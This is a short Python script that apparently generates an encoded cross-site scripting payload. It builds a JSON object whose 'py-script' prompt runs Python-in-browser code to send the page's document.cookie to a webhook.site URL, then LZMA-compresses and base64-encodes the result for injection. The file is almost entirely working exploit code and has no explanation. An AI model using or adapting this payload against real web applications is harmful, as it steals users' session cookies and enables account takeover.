```python
from base64 import b64encode
import json
from lzma import compress

payload = [{
    "tag": "py-script",
    "prompt": "import js; js.window.fetch('https://webhook.site/uuid?c='+js.document.cookie)",
    "answer": "lol"
}]

print(b64encode(compress(json.dumps(payload).encode())).decode())
```

